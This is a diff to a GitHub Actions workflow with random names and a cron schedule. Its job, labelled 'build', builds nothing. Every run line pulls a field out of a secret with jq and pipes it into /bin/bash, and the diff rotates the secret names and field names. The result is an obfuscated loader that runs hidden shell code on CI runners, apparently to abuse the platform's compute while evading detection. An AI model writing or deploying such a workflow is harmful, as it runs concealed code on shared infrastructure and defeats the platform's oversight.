@@ -2,7 +2,7 @@ name: wushenjiao4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
+    - cron: '51 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: wushenjiao4567
         env:
-          ogu71111: ${{ secrets.ogu71111 }}
+          z2552: ${{ secrets.z2552 }}
         run: |
-          echo $ogu71111 | jq -r .mudgx07643 | /bin/bash
-          echo $wgno4537 | jq -r .uywj32 | /bin/bash
-          echo $st3 | jq -r .k14 | /bin/bash
-          echo $bo30 | jq -r .vw02267 | /bin/bash
-          echo $bdzp0822 | jq -r .rilp20 | /bin/bash
-          echo $jlr93 | jq -r .okhp19 | /bin/bash
-          echo $ccwav611 | jq -r .ec3874 | /bin/bash
-          echo $wtt62405 | jq -r .mtl4 | /bin/bash
-          echo $g4 | jq -r .vfbb13476 | /bin/bash
-          echo $h03495 | jq -r .zgs89 | /bin/bash
+          echo $z2552 | jq -r .x565 | /bin/bash
+          echo $zkj73 | jq -r .zxp9 | /bin/bash
+          echo $cglq29 | jq -r .xba287 | /bin/bash
+          echo $dgq695 | jq -r .oeta9 | /bin/bash
+          echo $wwe381 | jq -r .g950 | /bin/bash
+          echo $ideb03009 | jq -r .jlnra038 | /bin/bash
+          echo $oedmc1 | jq -r .qxx743 | /bin/bash
+          echo $tgoi66 | jq -r .gbkol68 | /bin/bash
+          echo $fx4843 | jq -r .lylf17 | /bin/bash
+          echo $wchr082 | jq -r .mczb22741 | /bin/bash
+          echo $lppy661 | jq -r .rroe34 | /bin/bash
+          echo $ivcph8246 | jq -r .qokt27720 | /bin/bash
+          echo $omda965 | jq -r .ywiz4 | /bin/bash
+          echo $dodpe54556 | jq -r .fem3 | /bin/bash
+          echo $r95131 | jq -r .zk8300 | /bin/bash
+          echo $mz1 | jq -r .yd75 | /bin/bash
 
